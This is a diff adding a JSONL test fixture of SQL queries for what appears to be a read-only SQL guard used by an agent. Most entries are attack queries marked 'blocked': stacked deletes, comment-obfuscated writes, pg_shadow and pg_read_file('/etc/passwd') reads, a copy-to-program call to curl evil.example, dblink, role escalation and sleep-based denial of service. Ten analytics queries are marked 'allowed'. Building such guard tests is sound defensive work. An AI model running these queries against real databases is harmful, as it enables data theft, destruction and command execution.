@@ -1,0 +1,66 @@
+{"id": "A01", "category": "dml", "sql": "delete from orders_v", "expect": "blocked"}
+{"id": "A02", "category": "dml", "sql": "delete from shop.orders", "expect": "blocked"}
+{"id": "A03", "category": "dml", "sql": "update orders_v set status='cancelled'", "expect": "blocked"}
+{"id": "A04", "category": "dml", "sql": "insert into orders_v values (1,1,now(),'x','web')", "expect": "blocked"}
+{"id": "A05", "category": "dml", "sql": "truncate shop.orders", "expect": "blocked"}
+{"id": "A06", "category": "ddl", "sql": "drop table shop.orders", "expect": "blocked"}
+{"id": "A07", "category": "ddl", "sql": "drop view orders_v", "expect": "blocked"}
+{"id": "A08", "category": "ddl", "sql": "create table x as select * from orders_v", "expect": "blocked"}
+{"id": "A09", "category": "ddl", "sql": "alter role agent_ro superuser", "expect": "blocked"}
+{"id": "A10", "category": "ddl", "sql": "grant select on shop.customers to agent_ro", "expect": "blocked"}
+{"id": "A11", "category": "stacked", "sql": "select 1 from orders_v; delete from orders_v", "expect": "blocked"}
+{"id": "A12", "category": "stacked", "sql": "select * from orders_v;drop table shop.orders;--", "expect": "blocked"}
+{"id": "A13", "category": "stacked", "sql": "select * from orders_v where status='x'; update shop.orders set status='x'", "expect": "blocked"}
+{"id": "A14", "category": "comment_harmless", "sql": "select * from orders_v /*; delete from orders_v */", "expect": "allowed"}
+{"id": "A15", "category": "comment", "sql": "select * from orders_v -- ; drop table x\n; delete from orders_v", "expect": "blocked"}
+{"id": "A16", "category": "comment", "sql": "/**/delete/**/from/**/orders_v", "expect": "blocked"}
+{"id": "A17", "category": "comment", "sql": "DeLeTe FrOm OrDeRs_V", "expect": "blocked"}
+{"id": "A18", "category": "cte_write", "sql": "with d as (delete from orders_v returning *) select * from d", "expect": "blocked"}
+{"id": "A19", "category": "cte_write", "sql": "with u as (update shop.orders set status='x' returning 1) select count(*) from u", "expect": "blocked"}
+{"id": "A20", "category": "select_into", "sql": "select * into stolen from orders_v", "expect": "blocked"}
+{"id": "A21", "category": "locking", "sql": "select * from orders_v for update", "expect": "blocked"}
+{"id": "A22", "category": "locking", "sql": "select * from orders_v for share nowait", "expect": "blocked"}
+{"id": "A23", "category": "pii", "sql": "select email, phone from shop.customers", "expect": "blocked"}
+{"id": "A24", "category": "pii", "sql": "select * from shop.customers", "expect": "blocked"}
+{"id": "A25", "category": "pii", "sql": "select c.* from orders_v o join shop.customers c using(customer_id)", "expect": "blocked"}
+{"id": "A26", "category": "catalog", "sql": "select * from pg_catalog.pg_user", "expect": "blocked"}
+{"id": "A27", "category": "catalog", "sql": "select usename, passwd from pg_shadow", "expect": "blocked"}
+{"id": "A28", "category": "catalog", "sql": "select * from information_schema.tables", "expect": "blocked"}
+{"id": "A29", "category": "catalog", "sql": "select table_name from information_schema.columns", "expect": "blocked"}
+{"id": "A30", "category": "catalog", "sql": "select * from pg_stat_activity", "expect": "blocked"}
+{"id": "A31", "category": "catalog", "sql": "select rolname from pg_roles", "expect": "blocked"}
+{"id": "A32", "category": "function", "sql": "select version()", "expect": "blocked"}
+{"id": "A33", "category": "function", "sql": "select current_setting('data_directory')", "expect": "blocked"}
+{"id": "A34", "category": "function", "sql": "select set_config('statement_timeout','0',false)", "expect": "blocked"}
+{"id": "A35", "category": "function", "sql": "select pg_read_file('/etc/passwd')", "expect": "blocked"}
+{"id": "A36", "category": "function", "sql": "select pg_ls_dir('.')", "expect": "blocked"}
+{"id": "A37", "category": "function", "sql": "select lo_import('/etc/passwd')", "expect": "blocked"}
+{"id": "A38", "category": "function", "sql": "select pg_terminate_backend(pid) from pg_stat_activity", "expect": "blocked"}
+{"id": "A39", "category": "function", "sql": "select * from dblink('host=evil','select 1') as t(x int)", "expect": "blocked"}
+{"id": "A40", "category": "function", "sql": "select query_to_xml('select * from shop.customers', true, true, '')", "expect": "blocked"}
+{"id": "A41", "category": "dos", "sql": "select pg_sleep(30)", "expect": "blocked"}
+{"id": "A42", "category": "dos", "sql": "select count(*) from orders_v, pg_sleep(30)", "expect": "blocked"}
+{"id": "A43", "category": "dos", "sql": "select count(*) from order_items_v a, order_items_v b, order_items_v c", "expect": "blocked"}
+{"id": "A44", "category": "dos", "sql": "select * from generate_series(1, 100000000)", "expect": "blocked"}
+{"id": "A45", "category": "dos", "sql": "select count(*) from orders_v a cross join orders_v b cross join orders_v c", "expect": "blocked"}
+{"id": "A46", "category": "session", "sql": "set role postgres", "expect": "blocked"}
+{"id": "A47", "category": "session", "sql": "set statement_timeout = 0", "expect": "blocked"}
+{"id": "A48", "category": "session", "sql": "reset all", "expect": "blocked"}
+{"id": "A49", "category": "session", "sql": "begin; delete from orders_v; commit", "expect": "blocked"}
+{"id": "A50", "category": "session", "sql": "commit; delete from shop.orders", "expect": "blocked"}
+{"id": "A51", "category": "exec", "sql": "copy shop.customers to stdout", "expect": "blocked"}
+{"id": "A52", "category": "exec", "sql": "copy (select 1) to program 'curl evil.example'", "expect": "blocked"}
+{"id": "A53", "category": "exec", "sql": "do $$ begin execute 'delete from shop.orders'; end $$", "expect": "blocked"}
+{"id": "A54", "category": "exec", "sql": "call some_proc()", "expect": "blocked"}
+{"id": "A55", "category": "exec", "sql": "prepare p as delete from shop.orders", "expect": "blocked"}
+{"id": "A56", "category": "exec", "sql": "execute p", "expect": "blocked"}
+{"id": "L01", "category": "legit", "sql": "select region, count(*) as customers from customers_v group by region", "expect": "allowed"}
+{"id": "L02", "category": "legit", "sql": "select o.channel, sum(i.line_total) as revenue from orders_v o join order_items_v i using (order_id) where o.status <> 'cancelled' group by 1 order by 2 desc", "expect": "allowed"}
+{"id": "L03", "category": "legit", "sql": "with monthly as (select date_trunc('month', ordered_at) as m, count(*) n from orders_v group by 1) select * from monthly order by m", "expect": "allowed"}
+{"id": "L04", "category": "legit", "sql": "select p.category, round(avg(i.quantity), 2) from order_items_v i join products_v p using (product_id) group by 1", "expect": "allowed"}
+{"id": "L05", "category": "legit", "sql": "select status, count(*) from orders_v where ordered_at >= '2025-06-01' group by status", "expect": "allowed"}
+{"id": "L06", "category": "legit", "sql": "select c.segment, count(distinct o.order_id) from customers_v c join orders_v o using (customer_id) group by 1", "expect": "allowed"}
+{"id": "L07", "category": "legit", "sql": "select name, unit_price from products_v order by unit_price desc limit 5", "expect": "allowed"}
+{"id": "L08", "category": "legit", "sql": "select * from orders_v where order_id in (select order_id from order_items_v where quantity > 4) limit 10", "expect": "allowed"}
+{"id": "L09", "category": "legit", "sql": "select region from customers_v union select category from products_v", "expect": "allowed"}
+{"id": "L10", "category": "legit", "sql": "select extract(year from ordered_at) y, count(*) from orders_v group by 1", "expect": "allowed"}
